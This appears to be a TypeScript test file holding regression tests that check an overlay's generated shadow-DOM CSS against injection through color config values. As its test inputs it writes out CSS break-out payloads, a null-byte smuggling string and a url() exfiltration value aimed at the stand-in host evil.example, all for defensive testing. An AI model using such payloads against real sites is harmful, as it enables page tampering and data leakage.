/**
 * Adversarial tests for overlay CSS injection.
 *
 * The overlay builds a shadow-DOM stylesheet by interpolating config
 * values into a CSS template. Any string-typed config key that lands in a
 * CSS declaration must survive through a validator that returns
 * structurally-inert output — attacker-controlled characters must not
 * appear verbatim in the shadow-DOM CSS.
 *
 * Regression coverage for the disabledColor break-out vulnerability.
 */

import { test, describe, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert/strict';

import { generateShadowCSS } from '../core/overlay';
import { getConfig } from '../core/config';
import { setupDomEnv, teardownDomEnv } from './helpers/dom_env';

const globalScope = globalThis as { spatialNavConfig?: Record<string, unknown> };

beforeEach(() => setupDomEnv());
afterEach(() => teardownDomEnv());

function cssForDisabledColor(disabledColor: unknown): string {
    globalScope.spatialNavConfig = { disabledColor };
    try {
        return generateShadowCSS(getConfig());
    } finally {
        delete globalScope.spatialNavConfig;
    }
}

describe('generateShadowCSS — disabledColor injection guard', () => {
    test('accepts valid "r, g, b" triple', () => {
        const css = cssForDisabledColor('64, 128, 192');
        assert.match(css, /--sn-disabled-rgb: 64, 128, 192;/);
    });

    test('clamps out-of-range integers', () => {
        const css = cssForDisabledColor('9999, -5, 300');
        // 9999 → 255, -5 (regex allows only digits, so -5 fails to match and falls back),
        // 300 → 255. Pattern only accepts unsigned digits, so -5 triggers the fallback
        // for that channel — the whole parse falls back on malformed input.
        assert.match(css, /--sn-disabled-rgb: 128, 128, 128;/);
    });

    test('rejects CSS-breakout via closing brace', () => {
        const css = cssForDisabledColor('0,0,0; } body { display: none } :host { --x: 1');
        assert.match(css, /--sn-disabled-rgb: 128, 128, 128;/);
        // The attacker-specific tokens must not survive. The default stylesheet
        // legitimately includes `display: none` for the HUD, so we check for
        // the attacker's unique selector and variable name instead.
        assert.ok(!css.includes('body {'), 'must not leak attacker body selector');
        assert.ok(!css.includes('--x:'), 'must not leak attacker variable');
    });

    test('rejects url() exfiltration', () => {
        const css = cssForDisabledColor("128,128,128; --x: url('//evil.example/exfil?");
        assert.ok(!css.includes('evil.example'), 'must not leak url() exfiltration target');
        assert.ok(!css.includes('--x:'), 'must not leak attacker variables');
    });

    test('hex with trailing payload falls back (strict length check)', () => {
        const css = cssForDisabledColor('#ff0000; background: red');
        // Hex parse requires exactly 3 or 6 chars after `#`. Anything else
        // falls back to grey, preventing attacker payload smuggling via
        // trailing bytes on a valid-looking hex prefix.
        assert.match(css, /--sn-disabled-rgb: 128, 128, 128;/);
        assert.ok(!css.includes('background: red'), 'hex parse must not preserve trailing attacker payload');
    });

    test('rejects unicode null-byte smuggling', () => {
        const css = cssForDisabledColor('128,128,128\u0000; }body{display:none}');
        assert.match(css, /--sn-disabled-rgb: 128, 128, 128;/);
        assert.ok(!css.includes('display:none'), 'must not leak past null byte');
    });

    test('non-string input falls back to default', () => {
        const css = cssForDisabledColor(42);
        assert.match(css, /--sn-disabled-rgb: 128, 128, 128;/);
    });
});

describe('generateShadowCSS — color injection guard (regression)', () => {
    test('rejects CSS-breakout in color', () => {
        globalScope.spatialNavConfig = { color: 'red; } body { display: none } :host {' };
        try {
            const css = generateShadowCSS(getConfig());
            assert.ok(!css.includes('body {'), 'must not leak attacker body selector via color');
        } finally {
            delete globalScope.spatialNavConfig;
        }
    });
});
